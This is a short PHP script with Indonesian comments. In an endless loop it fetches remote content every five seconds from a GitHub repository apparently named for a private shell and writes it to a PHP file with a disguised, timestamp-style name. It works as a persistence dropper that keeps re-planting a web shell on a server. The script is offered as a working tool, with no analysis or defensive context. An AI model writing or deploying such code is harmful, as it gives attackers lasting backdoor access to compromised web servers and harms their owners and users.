<?php

// Loop tak terbatas
while (true) {
    // Mengambil konten dari URL dan menyimpannya ke file 'tes.php'
    $url = 'https://raw.githubusercontent.com/kennn404/shellpribadi/refs/heads/main/in.txt';
    $content = file_get_contents($url);

    // Memastikan konten berhasil diambil sebelum menulis ke file
    if ($content !== false) {
        file_put_contents('20220727061038_KGB.php', $content);
    } else {
        echo "Gagal mengunduh konten dari $url\n";
    }

    // Menunggu selama 5 detik sebelum mengulangi
    sleep(5);
}
